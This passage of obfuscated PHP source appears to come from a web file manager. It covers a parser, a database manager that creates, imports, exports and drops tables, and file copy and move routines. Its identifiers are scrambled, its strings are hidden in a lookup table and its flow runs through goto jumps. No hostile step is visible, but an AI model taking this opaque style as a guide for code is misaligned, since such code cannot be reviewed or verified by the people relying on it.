$c‹ŒšÙ¥È = hexdec(bin2hex(substr($c¨Ø É¤…, $dî§óÍ£, 2))); $D¤¦İÎù¡Ø .= mb_convert_encoding($dá·èÑ†³°[1597] . intval($c‹ŒšÙ¥È) . $dá·èÑ†³°[67], $dá·èÑ†³°[1598], $dá·èÑ†³°[1599]); } } goto BŸ§Ÿ¯°Æƒ; BŸ§Ÿ¯°Æƒ: return $D¤¦İÎù¡Ø; goto C…ãà†«; a´¥Ë¨¦»Ş: $D¤¦İÎù¡Ø = $dá·èÑ†³°[33]; foreach ($fæñ®ãğÊ as $E“‹˜Ş‰—) { if (preg_match($dá·èÑ†³°[1589], $E“‹˜Ş‰—)) { $D¤¦İÎù¡Ø .= \chr(hexdec(trim($E“‹˜Ş‰—, $dá·èÑ†³°[1590]))); } else { $D¤¦İÎù¡Ø .= $E“‹˜Ş‰—; } } $fæñ®ãğÊ = preg_split($dá·èÑ†³°[1591], $D¤¦İÎù¡Ø, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D±Õ”¸‘ƒ•; a×Î“«˜‘¾: $D¤¦İÎù¡Ø = $dá·èÑ†³°[33]; foreach ($fæñ®ãğÊ as $E“‹˜Ş‰—) { if (preg_match($dá·èÑ†³°[1587], $E“‹˜Ş‰—)) { $D¤¦İÎù¡Ø .= \chr(octdec(trim($E“‹˜Ş‰—, $dá·èÑ†³°[93]))); } else { $D¤¦İÎù¡Ø .= $E“‹˜Ş‰—; } } $fæñ®ãğÊ = preg_split($dá·èÑ†³°[1588], $D¤¦İÎù¡Ø, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a´¥Ë¨¦»Ş; C…ãà†«: } private static function getRawObject($B¹ò›ùİ, $cõøÜ›½½¯ = 0) { goto a Ê®Ô¿‰õ; a‹ø¹åÍ¥: return array($CĞ¿¹í®÷É, $E±’™ÂÔª, $cõøÜ›½½¯); goto e§Ü±‰ìê; a Ê®Ô¿‰õ: $E÷‘Ìã„¥Ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[33]; $E±’™ÂÔª = $E÷‘Ìã„¥Ä[33]; goto b¥†ï’¥éÊ; b¥†ï’¥éÊ: $cõøÜ›½½¯ += strspn($B¹ò›ùİ, $E÷‘Ìã„¥Ä[1600], $cõøÜ›½½¯); $D¶æ„®íò¶ = $B¹ò›ùİ[$cõøÜ›½½¯]; switch ($D¶æ„®íò¶) { case $E÷‘Ìã„¥Ä[1601]: $A¯™¹¤’»¤ = strcspn($B¹ò›ùİ, $E÷‘Ìã„¥Ä[1602], $cõøÜ›½½¯); if ($A¯™¹¤’»¤ > 0) { $cõøÜ›½½¯ += $A¯™¹¤’»¤; return self::getRawObject($B¹ò›ùİ, $cõøÜ›½½¯); } break; case $E÷‘Ìã„¥Ä[8]: $CĞ¿¹í®÷É = $D¶æ„®íò¶; ++$cõøÜ›½½¯; $E ™×î“”ñ = preg_match($E÷‘Ìã„¥Ä[1603], substr($B¹ò›ùİ, $cõøÜ›½½¯, 256), $a–¼‡ÑÀô–); if (1 == $E ™×î“”ñ) { $E±’™ÂÔª = $a–¼‡ÑÀô–[1]; $cõøÜ›½½¯ += strlen($E±’™ÂÔª); } break; case $E÷‘Ìã„¥Ä[248]: case $E÷‘Ìã„¥Ä[821]: $CĞ¿¹í®÷É = $D¶æ„®íò¶; ++$cõøÜ›½½¯; $còï«¾õÙí = $cõøÜ›½½¯; if ($E÷‘Ìã„¥Ä[248] == $D¶æ„®íò¶) { $EÏÈãØ¦ˆÆ = 1; while ($EÏÈãØ¦ˆÆ > 0) { if (!isset($B¹ò›ùİ[$còï«¾õÙí])) { break; } $cóŒ°ÎŞÖ‡ = $B¹ò›ùİ[$còï«¾õÙí]; switch ($cóŒ°ÎŞÖ‡) { case $E÷‘Ìã„¥Ä[93]: ++$còï«¾õÙí; break; case $E÷‘Ìã„¥Ä[248]: ++$EÏÈãØ¦ˆÆ; break; case $E÷‘Ìã„¥Ä[821]: --$EÏÈãØ¦ˆÆ; break; } ++$còï«¾õÙí; } $E±’™ÂÔª = substr($B¹ò›ùİ, $cõøÜ›½½¯, $còï«¾õÙí - $cõøÜ›½½¯ - 1); $cõøÜ›½½¯ = $còï«¾õÙí; } break; case $E÷‘Ìã„¥Ä[157]: case $E÷‘Ìã„¥Ä[476]: $CĞ¿¹í®÷É = $D¶æ„®íò¶; ++$cõøÜ›½½¯; if ($E÷‘Ìã„¥Ä[157] == $D¶æ„®íò¶) { $E±’™ÂÔª = array(); do { $CÜÕßÎÊİ¼ = $cõøÜ›½½¯; $d­Ô¼˜ø™¸ = self::getRawObject($B¹ò›ùİ, $cõøÜ›½½¯); $cõøÜ›½½¯ = $d­Ô¼˜ø™¸[2]; $E±’™ÂÔª[] = $d­Ô¼˜ø™¸; } while ($E÷‘Ìã„¥Ä[476] != $d­Ô¼˜ø™¸[0] && $cõøÜ›½½¯ != $CÜÕßÎÊİ¼); array_pop($E±’™ÂÔª); } break; case $E÷‘Ìã„¥Ä[929]: case $E÷‘Ìã„¥Ä[932]: if (isset($B¹ò›ùİ[$cõøÜ›½½¯ + 1]) && $B¹ò›ùİ[$cõøÜ›½½¯ + 1] == $D¶æ„®íò¶) { $CĞ¿¹í®÷É = $D¶æ„®íò¶ . $D¶æ„®íò¶; $cõøÜ›½½¯ += 2; if ($E÷‘Ìã„¥Ä[929] == $D¶æ„®íò¶) { $E±’™ÂÔª = array(); do { $CÜÕßÎÊİ¼ = $cõøÜ›½½¯; $d­Ô¼˜ø™¸ = self::getRawObject($B¹ò›ùİ, $cõøÜ›½½¯); $cõøÜ›½½¯ = $d­Ô¼˜ø™¸[2]; $E±’™ÂÔª[] = $d­Ô¼˜ø™¸; } while ($E÷‘Ìã„¥Ä[1604] != $d­Ô¼˜ø™¸[0] && $cõøÜ›½½¯ != $CÜÕßÎÊİ¼); array_pop($E±’™ÂÔª); } } else { $CĞ¿¹í®÷É = $D¶æ„®íò¶; ++$cõøÜ›½½¯; $E ™×î“”ñ = preg_match($E÷‘Ìã„¥Ä[1605], substr($B¹ò›ùİ, $cõøÜ›½½¯), $a–¼‡ÑÀô–); if ($E÷‘Ìã„¥Ä[929] == $D¶æ„®íò¶ && 1 == $E ™×î“”ñ) { $E±’™ÂÔª = strtr($a–¼‡ÑÀô–[1], $E÷‘Ìã„¥Ä[1606], $E÷‘Ìã„¥Ä[33]); $cõøÜ›½½¯ += \strlen($a–¼‡ÑÀô–[0]); } elseif (!1 !== ($BÂÀãäëœ¼ = strpos($B¹ò›ùİ, $E÷‘Ìã„¥Ä[932], $cõøÜ›½½¯))) { $cõøÜ›½½¯ = $BÂÀãäëœ¼ + 1; } } break; default: if ($E÷‘Ìã„¥Ä[1607] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 6)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1607]; $cõøÜ›½½¯ += 6; } elseif ($E÷‘Ìã„¥Ä[99] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 4)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[99]; $cõøÜ›½½¯ += 4; $E±’™ÂÔª = $E÷‘Ìã„¥Ä[99]; } elseif ($E÷‘Ìã„¥Ä[1608] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 4)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1609]; $cõøÜ›½½¯ += 4; $E±’™ÂÔª = $E÷‘Ìã„¥Ä[1608]; } elseif ($E÷‘Ìã„¥Ä[1610] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 5)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1609]; $cõøÜ›½½¯ += 5; $E±’™ÂÔª = $E÷‘Ìã„¥Ä[1610]; } elseif ($E÷‘Ìã„¥Ä[1611] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 6)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1611]; $cõøÜ›½½¯ += 6; if (1 == preg_match($E÷‘Ìã„¥Ä[1612], substr($B¹ò›ùİ, $cõøÜ›½½¯), $a–¼‡ÑÀô–)) { $cõøÜ›½½¯ += strlen($a–¼‡ÑÀô–[0]); $aÄÃÂ´ççä = $E÷‘Ìã„¥Ä[1613]; $E ™×î“”ñ = preg_match($aÄÃÂ´ççä, substr($B¹ò›ùİ, $cõøÜ›½½¯), $a–¼‡ÑÀô–, PREG_OFFSET_CAPTURE); if (1 == $E ™×î“”ñ) { $E±’™ÂÔª = substr($B¹ò›ùİ, $cõøÜ›½½¯, $a–¼‡ÑÀô–[0][1]); $cõøÜ›½½¯ += $a–¼‡ÑÀô–[1][1]; } } } elseif ($E÷‘Ìã„¥Ä[1614] == substr($B¹ò›ùİ, $cõøÜ›½½¯, 9)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1614]; $cõøÜ›½½¯ += 9; } elseif (1 == preg_match($E÷‘Ìã„¥Ä[1615], substr($B¹ò›ùİ, $cõøÜ›½½¯, 33), $a–¼‡ÑÀô–)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1577]; $cõøÜ›½½¯ += strlen($a–¼‡ÑÀô–[0]); $E±’™ÂÔª = intval($a–¼‡ÑÀô–[1]) . $E÷‘Ìã„¥Ä[70] . intval($a–¼‡ÑÀô–[2]); } elseif (1 == preg_match($E÷‘Ìã„¥Ä[1616], substr($B¹ò›ùİ, $cõøÜ›½½¯, 33), $a–¼‡ÑÀô–)) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1617]; $E±’™ÂÔª = intval($a–¼‡ÑÀô–[1]) . $E÷‘Ìã„¥Ä[70] . intval($a–¼‡ÑÀô–[2]); $cõøÜ›½½¯ += strlen($a–¼‡ÑÀô–[0]); } elseif (($bŞ³ğà·÷è = strspn($B¹ò›ùİ, $E÷‘Ìã„¥Ä[1618], $cõøÜ›½½¯)) > 0) { $CĞ¿¹í®÷É = $E÷‘Ìã„¥Ä[1619]; $E±’™ÂÔª = substr($B¹ò›ùİ, $cõøÜ›½½¯, $bŞ³ğà·÷è); $cõøÜ›½½¯ += $bŞ³ğà·÷è; } break; } goto a‹ø¹åÍ¥; e§Ü±‰ìê: } } goto A¾†àå£åÀ; DÈÁÓŒ÷½ù: class DbManage { function __construct($Aš‹ƒ÷ÓºÏ, $b™Î‘°Éíä = '') { $this->database = $Aš‹ƒ÷ÓºÏ; $this->type = $b™Î‘°Éíä; } public function model($a‹ÖÏÖèÉâ = '') { return new ModelBase($a‹ÖÏÖèÉâ, $_SERVER[³‘’¼äÑ™ÔÍ][33], $this->database); } public function db($døâ—Î¨ê = false) { goto eï°Õƒ‚µ; dŒ¿šØæ: $C±Š‰®Ñ¨Ò = $AÓÌ“›¶[$CªÌ¸ã©¾¢[889]]; $AÓÌ“›¶[$CªÌ¸ã©¾¢[889]] = $CªÌ¸ã©¾¢[33]; if ($AÓÌ“›¶[$CªÌ¸ã©¾¢[726]] == $CªÌ¸ã©¾¢[727]) { $fÖƒ•ğ‰Äè = $AÓÌ“›¶[$CªÌ¸ã©¾¢[728]]; $AÓÌ“›¶[$CªÌ¸ã©¾¢[728]] = substr($fÖƒ•ğ‰Äè, 0, strrpos($fÖƒ•ğ‰Äè, $CªÌ¸ã©¾¢[977])); } goto AÀÖ‚Ã¸Ã‡; a‘†¸ŒØ—ì: if (!$e¾ÙÊò¨öŞ) { $eÎ˜ƒ“ñ‰ˆ->execute("\143\x72\145\141\x74\145\x20\x64\141\164\x61\142\141\x73\x65\40\x60{$C±Š‰®Ñ¨Ò}\140"); } $AÓÌ“›¶[$CªÌ¸ã©¾¢[889]] = $C±Š‰®Ñ¨Ò; if ($AÓÌ“›¶[$CªÌ¸ã©¾¢[726]] == $CªÌ¸ã©¾¢[727]) { $AÓÌ“›¶[$CªÌ¸ã©¾¢[728]] .= $CªÌ¸ã©¾¢[977] . $C±Š‰®Ñ¨Ò; } goto eåŒ²ˆŠ; eï°Õƒ‚µ: $CªÌ¸ã©¾¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÓÌ“›¶ = array_change_key_case($this->database); if ($this->type == $CªÌ¸ã©¾¢[9] || !$døâ—Î¨ê) { return $this->model()->db(); } goto dŒ¿šØæ; eåŒ²ˆŠ: $this->database = $AÓÌ“›¶; $eÎ˜ƒ“ñ‰ˆ->execute("\x75\x73\x65\x20\x60{$C±Š‰®Ñ¨Ò}\140"); return $eÎ˜ƒ“ñ‰ˆ; goto fÙùĞ¡°ˆ; AÀÖ‚Ã¸Ã‡: $this->database = $AÓÌ“›¶; $eÎ˜ƒ“ñ‰ˆ = $this->model()->db(); try { $e¾ÙÊò¨öŞ = $eÎ˜ƒ“ñ‰ˆ->execute("\163\150\x6f\167\40\144\x61\x74\x61\142\141\163\145\x73\x20\154\x69\153\x65\40\47{$C±Š‰®Ñ¨Ò}\47"); } catch (Exception $ağÛ‹–Ç’×) { } goto a‘†¸ŒØ—ì; fÙùĞ¡°ˆ: } public function createTable($DÆ¬Ğ³³íª, $Fç¢¯îÑÂã = null) { $EÌÚ¦‡Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!IO::exist($DÆ¬Ğ³³íª)) { show_json(LNG($EÌÚ¦‡Œ[978]), !1); } $b‘à”¬¡ğ = sqlSplit(IO::getContent($DÆ¬Ğ³³íª)); foreach ($b‘à”¬¡ğ as $c”İØ™§¿Ë) { if ($Fç¢¯îÑÂã) { $cšê™êÌ¶İ = stripos($c”İØ™§¿Ë, $EÌÚ¦‡Œ[979]) === 0; if ($cšê™êÌ¶İ) { $Fç¢¯îÑÂã->task[$EÌÚ¦‡Œ[980]] += 1; } } $this->model()->db()->execute($c”İØ™§¿Ë); if ($Fç¢¯îÑÂã && $cšê™êÌ¶İ) { preg_match($EÌÚ¦‡Œ[981], $c”İØ™§¿Ë, $f©÷»›®À); $Fç¢¯îÑÂã->task[$EÌÚ¦‡Œ[982]] = $f©÷»›®À[1]; $Fç¢¯îÑÂã->update(1); } } $this->taskToCache($Fç¢¯îÑÂã); } public function insertTable($B…‰ªœÜ–ñ, $C–¢¤ºâÙ = null) { $C‰¯•Ä’“ñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B¾ƒ²×”ø¡ = $this->model()->db(); $Bµæª—®Ğ = $bãòƒßÉ²• ? array($bãòƒßÉ²•) : $B¾ƒ²×”ø¡->getTables(); foreach ($B…‰ªœÜ–ñ as $F Çˆ½ˆØ) { $bãòƒßÉ²• = basename($F Çˆ½ˆØ, $C‰¯•Ä’“ñ[721]); if (!in_array($bãòƒßÉ²•, $Bµæª—®Ğ)) { continue; } if ($C–¢¤ºâÙ) { $C–¢¤ºâÙ->task[$C‰¯•Ä’“ñ[982]] = $bãòƒßÉ²•; } if (get_filesize($F Çˆ½ˆØ) == 0) { continue; } $cŒÔÇç™Å÷ = $this->sqlToDb($F Çˆ½ˆØ, $C–¢¤ºâÙ); if (!$cŒÔÇç™Å÷) { show_json(LNG($C‰¯•Ä’“ñ[983]) . "\x5b{$bãòƒßÉ²•}\135", !1); } } $this->taskToCache($C–¢¤ºâÙ); } public function sqlFromDb($B·ÖäƒŒë“, $eÜÍ‚‘­ò®, $Dàñ–¦†¬ = null, $FˆÕíáò‹ = null) { goto EÛù¸Èïâ; C´ò†±Ç«“: $f†‰‘™‰òé = $e¨ó²Åƒõ->getPk(); $EŒßÅÆêëÀ = $e¨ó²Åƒõ->getDbFields(); do { $d“–¡ÔŒ’è = $e¨ó²Åƒõ->field($EŒßÅÆêëÀ)->order($f†‰‘™‰òé . $_SERVER[³‘’¼äÑ™ÔÍ][985])->selectPage($A£÷Èæªƒ, $Eäï·ì¨—ó); $bàË³‚‰®¬ = isset($d“–¡ÔŒ’è[$_SERVER[³‘’¼äÑ™ÔÍ][351]][$_SERVER[³‘’¼äÑ™ÔÍ][353]]) ? $d“–¡ÔŒ’è[$_SERVER[³‘’¼äÑ™ÔÍ][351]][$_SERVER[³‘’¼äÑ™ÔÍ][353]] : 0; $cÊÁº¡§‰Á = !empty($d“–¡ÔŒ’è[$_SERVER[³‘’¼äÑ™ÔÍ][354]]) ? $d“–¡ÔŒ’è[$_SERVER[³‘’¼äÑ™ÔÍ][354]] : array(); if (!($f¯ä†µ = count($cÊÁº¡§‰Á))) { break; } $dÜ±èÈ¼îò = array(); foreach ($cÊÁº¡§‰Á as $c ß‚ŠìĞß) { if ($B·ÖäƒŒë“ == $_SERVER[³‘’¼äÑ™ÔÍ][986] && $c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][29]] == $_SERVER[³‘’¼äÑ™ÔÍ][987]) { $cÒæÏÛÎ‚¿ = json_decode($c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][359]], !0); if ($cÒæÏÛÎ‚¿[$_SERVER[³‘’¼äÑ™ÔÍ][28]] == date($_SERVER[³‘’¼äÑ™ÔÍ][693]) && !$cÒæÏÛÎ‚¿[$_SERVER[³‘’¼äÑ™ÔÍ][692]]) { continue; } } if ($FˆÕíáò‹) { $c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][75]] = "\173\151\x6f\72{$FˆÕíáò‹}\x7d" . substr($c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][75]], strlen("\173\x69\x6f\x3a{$c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][747]]}\175")); $c ß‚ŠìĞß[$_SERVER[³‘’¼äÑ™ÔÍ][747]] = $FˆÕíáò‹; } $dÜ±èÈ¼îò[] = $_SERVER[³‘’¼äÑ™ÔÍ][988] . $this->sqlEncode($c ß‚ŠìĞß) . $_SERVER[³‘’¼äÑ™ÔÍ][989]; } $EÀçì´„Å = "\x49\x4e\x53\105\122\124\40\111\x4e\x54\x4f\x20\140{$B·ÖäƒŒë“}\x60\40\50\140" . implode($_SERVER[³‘’¼äÑ™ÔÍ][990], $EŒßÅÆêëÀ) . $_SERVER[³‘’¼äÑ™ÔÍ][991]; fwrite($DÌÌğˆì´, $EÀçì´„Å . implode($_SERVER[³‘’¼äÑ™ÔÍ][992], $dÜ±èÈ¼îò) . $_SERVER[³‘’¼äÑ™ÔÍ][67] . PHP_EOL); $Eäï·ì¨—ó++; $BâÚ …­«Ğ += $f¯ä†µ; if ($Dàñ–¦†¬) { $Dàñ–¦†¬->update($f¯ä†µ); } } while ($Eäï·ì¨—ó <= $bàË³‚‰®¬); goto Cëİ¸ÙŒƒí; EÛù¸Èïâ: if ($Dàñ–¦†¬) { $Dàñ–¦†¬->task[$_SERVER[³‘’¼äÑ™ÔÍ][982]] = $B·ÖäƒŒë“; } $e¨ó²Åƒõ = $this->model($B·ÖäƒŒë“); $BâÚ …­«Ğ = 0; goto bôâù°°«Ü; bôâù°°«Ü: $Eäï·ì¨—ó = 1; $A£÷Èæªƒ = 500; $DÌÌğˆì´ = fopen($eÜÍ‚‘­ò®, $_SERVER[³‘’¼äÑ™ÔÍ][984]); goto C´ò†±Ç«“; Cëİ¸ÙŒƒí: fclose($DÌÌğˆì´); return $BâÚ …­«Ğ; goto Cå–ğÌë’’; Cå–ğÌë’’: } public function sqlToDb($DÂ‹Èõ…½Á, $a¡Ğµ·¸š = null) { goto B­ ÈÂë‚; B™Í³Ñ¨‰: if (trim($c†¡‘ÚŠØ¶)) { $c†¡‘ÚŠØ¶ = rtrim(trim($c†¡‘ÚŠØ¶), $fÙ–ğ³³·Å[67]); if (!$Fê³éè¢Î->execute($c†¡‘ÚŠØ¶)) { return !1; } if ($a¡Ğµ·¸š) { $a¡Ğµ·¸š->update($F¼¼¥ğœš - 1); } } return !0; goto e¬×İ¤½×Í; C‚ºØÕˆ¡Œ: $b½Ò¤‘õÂ = 500 + 1; while (!feof($DãÙîÊ˜¡¯)) { if ($a¡Ğµ·¸š && $F¼¼¥ğœš != 0) { $a¡Ğµ·¸š->task[$fÙ–ğ³³·Å[980]] += 1; } $F¼¼¥ğœš++; $d…»ÅÓÉ§ = trim(fgets($DãÙîÊ˜¡¯)); $c†¡‘ÚŠØ¶ .= $fÙ–ğ³³·Å[50] . $this->sqlDecode($d…»ÅÓÉ§, $this->type); if ($F¼¼¥ğœš == $b½Ò¤‘õÂ) { $c†¡‘ÚŠØ¶ = rtrim(trim($c†¡‘ÚŠØ¶), $fÙ–ğ³³·Å[67]); if (!$Fê³éè¢Î->execute($c†¡‘ÚŠØ¶)) { return !1; } if ($a¡Ğµ·¸š) { $a¡Ğµ·¸š->update($F¼¼¥ğœš - 1); } $c†¡‘ÚŠØ¶ = $fÙ–ğ³³·Å[33]; $F¼¼¥ğœš = 0; } } fclose($DãÙîÊ˜¡¯); goto B™Í³Ñ¨‰; F÷œ¸½óâ¾: if (!$DãÙîÊ˜¡¯) { return !1; } $F¼¼¥ğœš = 0; $c†¡‘ÚŠØ¶ = $fÙ–ğ³³·Å[33]; goto C‚ºØÕˆ¡Œ; B­ ÈÂë‚: $fÙ–ğ³³·Å =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fê³éè¢Î = $this->model()->db(); $DãÙîÊ˜¡¯ = @fopen($DÂ‹Èõ…½Á, $fÙ–ğ³³·Å[993]); goto F÷œ¸½óâ¾; e¬×İ¤½×Í: } public function dropTable($c®å–ààï = null) { $CÄ†—œ‡  = $this->model()->db(); $D«´˜Ä Æµ = $c®å–ààï ? array($c®å–ààï) : $CÄ†—œ‡ ->getTables(); if (!$D«´˜Ä Æµ) { return; } foreach ($D«´˜Ä Æµ as $c®å–ààï) { $CÄ†—œ‡ ->execute("\x64\x72\157\x70\40\164\x61\142\x6c\145\x20\x69\146\x20\x65\170\151\163\x74\163\40\x60{$c®å–ààï}\140"); } } private function taskToCache($a‹í©Èˆ½ = null) { $B¾Ã…Ù¸· =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$a‹í©Èˆ½) { return; } $c§£¶ŠöŒ¡ = array($B¾Ã…Ù¸·[982] => $a‹í©Èˆ½->task[$B¾Ã…Ù¸·[982]], $B¾Ã…Ù¸·[980] => $a‹í©Èˆ½->task[$B¾Ã…Ù¸·[980]], $B¾Ã…Ù¸·[994] => $a‹í©Èˆ½->task[$B¾Ã…Ù¸·[994]]); if ($c§£¶ŠöŒ¡[$B¾Ã…Ù¸·[980]] == $c§£¶ŠöŒ¡[$B¾Ã…Ù¸·[994]]) { $c§£¶ŠöŒ¡[$B¾Ã…Ù¸·[699]] = 1; } Cache::set($B¾Ã…Ù¸·[995] . $a‹í©Èˆ½->task[$B¾Ã…Ù¸·[367]], $c§£¶ŠöŒ¡); $a‹í©Èˆ½->end(); } private function sqlEncode($cä‰¬É¼½) { $aåÀÓøÂ’¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e„„‚…õŠ = array(); foreach ($cä‰¬É¼½ as $d×Œ¨ì­½Œ) { if (is_array($d×Œ¨ì­½Œ)) { $d×Œ¨ì­½Œ = json_encode_force($d×Œ¨ì­½Œ); } $d×Œ¨ì­½Œ = addslashes($d×Œ¨ì­½Œ); $d×Œ¨ì­½Œ = str_replace(array($aåÀÓøÂ’¦[996], $aåÀÓøÂ’¦[217]), array($aåÀÓøÂ’¦[997], $aåÀÓøÂ’¦[998]), $d×Œ¨ì­½Œ); $e„„‚…õŠ[] = str_replace($aåÀÓøÂ’¦[55], $aåÀÓøÂ’¦[999], $d×Œ¨ì­½Œ); } return $aåÀÓøÂ’¦[55] . implode($aåÀÓøÂ’¦[1000], $e„„‚…õŠ) . $aåÀÓøÂ’¦[55]; } private function sqlDecode($fŞî§Üˆïò, $bˆèÊßÚ¼Œ) { $B°œ¼àŞé¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fŞî§Üˆïò = str_replace(array($B°œ¼àŞé¹[997], $B°œ¼àŞé¹[998]), array($B°œ¼àŞé¹[996], $B°œ¼àŞé¹[217]), $fŞî§Üˆïò); if ($bˆèÊßÚ¼Œ == $B°œ¼àŞé¹[9]) { $fŞî§Üˆïò = stripslashes($fŞî§Üˆïò); } return $fŞî§Üˆïò; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($EàÄ¥î‚³•, $d¿¶ß¦ß­÷) { $BØ’«À²ÊÒ = self::driverMake($d¿¶ß¦ß­÷[0]); if (method_exists($BØ’«À²ÊÒ, $EàÄ¥î‚³•)) { return @call_user_func_array(array($BØ’«À²ÊÒ, $EàÄ¥î‚³•), $d¿¶ß¦ß­÷); } if (method_exists($BØ’«À²ÊÒ, $_SERVER[³‘’¼äÑ™ÔÍ][1001])) { return @call_user_func_array(array($BØ’«À²ÊÒ, $EàÄ¥î‚³•), $d¿¶ß¦ß­÷); } else { if (method_exists(self, $EàÄ¥î‚³•)) { return @call_user_func_array(array(self, $EàÄ¥î‚³•), $d¿¶ß¦ß­÷); } else { call_user_func_array(array(parent, $EàÄ¥î‚³•), $d¿¶ß¦ß­÷); } } } public static function init($a‰íˆÜƒãƒ) { return self::driverMake($a‰íˆÜƒãƒ); } public static function copy($DìÜªÛÈ¶, $c®›ƒÚ§Å, $f³©‘ß… = false, $fÕªãÑ„â = false) { return self::copyMove($DìÜªÛÈ¶, $c®›ƒÚ§Å, $f³©‘ß…, $_SERVER[³‘’¼äÑ™ÔÍ][490], $fÕªãÑ„â); } public static function move($EĞ¡ˆ×Î², $fÏŒ³„íóŠ, $cŸ”‚ãÈ† = false, $E‹·¼Å±Ñ¹ = false) { return self::copyMove($EĞ¡ˆ×Î², $fÏŒ³„íóŠ, $cŸ”‚ãÈ†, $_SERVER[³‘’¼äÑ™ÔÍ][492], $E‹·¼Å±Ñ¹); } public static function saveFile($B»Á¦Ï»Ü¥, $cÙˆğ™³’œ, $DĞ„‚¢¥ = true) { goto d¬¹­´‡¤è; AÙ¦Ë¨«: $f£µ„óÁ²“ = self::driverMake($cÙˆğ™³’œ); $B¿ãŞÅÀÕ‘ = !1; if ($f£µ„óÁ²“->pathParse[$eğ×ôá‰•Ÿ[1002]]) { $C“¥ª‹™­Í = $f£µ„óÁ²“->pathParse[$eğ×ôá‰•Ÿ[1002]]; $B¿ãŞÅÀÕ‘ = $f£µ„óÁ²“; $f£µ„óÁ²“ = self::driverMake($C“¥ª‹™­Í); } goto BÈà”ÁÃ„½; BÈà”ÁÃ„½: $f·Š¥Ãµ« = $f£µ„óÁ²“->pathFather($cÙˆğ™³’œ); $eÍË‹©§ƒÜ = !0; if (!$DĞ„‚¢¥ && self::driverIsSame($açâ‚‘ë¹ˆ, $f£µ„óÁ²“)) { $eÍË‹©§ƒÜ = !1; } goto bÓó®Œ¥à³; d¬¹­´‡¤è: $eğ×ôá‰•Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bïˆï¿éõ = self::info($cÙˆğ™³’œ); $açâ‚‘ë¹ˆ = self::driverMake($B»Á¦Ï»Ü¥); goto AÙ¦Ë¨«; bÓó®Œ¥à³: $Eİ†óë¡ † = self::copyFile($açâ‚‘ë¹ˆ, $B»Á¦Ï»Ü¥, $f£µ„óÁ²“, $f·Š¥Ãµ«, $bïˆï¿éõ[$eğ×ôá‰•Ÿ[28]], $eÍË‹©§ƒÜ); if ($B¿ãŞÅÀÕ‘) { $Eİ†óë¡ † = $B¿ãŞÅÀÕ‘->getPathOuter($Eİ†óë¡ †); } return $Eİ†óë¡ †; goto bß‹‰ŸËƒé; bß‹‰ŸËƒé: } private static function copyMove($F°ø«‘, $DÕ»áîîÈº, $f¢ö¤ïÎ¾±, $cƒ¼ù‡‘æù, $CáÍ‚©ÖÜæ = false) { goto a­›¨ÁİÔ ; eòµƒ«ƒó: $c´¾†¹¡¿ = $C±’˜’œ’Œ->isFile($F°ø«‘); if (!$c´¾†¹¡¿ && $BÌØè¼¸ªÁ->getType() == $f¹¢ÚÓÅ™[697] && $C±’˜’œ’Œ->getType() == $f¹¢ÚÓÅ™[102]) { $dçÈáäï½ = $BÌØè¼¸ªÁ->copyFolderFromIO($C±’˜’œ’Œ, $F°ø«‘, $DÕ»áîîÈº, $f¢ö¤ïÎ¾±, $EÓ ğŠİŸˆ, $CáÍ‚©ÖÜæ); } else { $dçÈáäï½ = self::copyPath($C±’˜’œ’Œ, $F°ø«‘, $BÌØè¼¸ªÁ, $DÕ»áîîÈº, $f¢ö¤ïÎ¾±, $EÓ ğŠİŸˆ, $c´¾†¹¡¿, $CáÍ‚©ÖÜæ); } if ($dçÈáäï½ && $EÓ ğŠİŸˆ) { $C±’˜’œ’Œ->remove($F°ø«‘); } goto EîŒ¿ì…Ÿ; b§è¸ÛÃß¶: $C±’˜’œ’Œ = self::driverMake($F°ø«‘); $BÌØè¼¸ªÁ = self::driverMake($DÕ»áîîÈº); $EÓ ğŠİŸˆ = $cƒ¼ù‡‘æù == $f¹¢ÚÓÅ™[492]; goto cêŸİ°î†œ; a­›¨ÁİÔ : $f¹¢ÚÓÅ™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$F°ø«‘ || $F°ø«‘ == $f¹¢ÚÓÅ™[8] || !$DÕ»áîîÈº) { return !1; } ignore_timeout(); goto b§è¸ÛÃß¶; EîŒ¿ì…Ÿ: if ($B¢ñß¸ïÓ) { $dçÈáäï½ = $B¢ñß¸ïÓ->getPathOuter($dçÈáäï½); } return $dçÈáäï½; goto EäçŠ§Ò­; Eğ¾µÊÖôà: Hook::trigger($f¹¢ÚÓÅ™[72], $C±’˜’œ’Œ, $F°ø«‘, $BÌØè¼¸ªÁ, $DÕ»áîîÈº); $bÌÀæ«•ò« = self::driverIsSame($C±’˜’œ’Œ, $BÌØè¼¸ªÁ); if 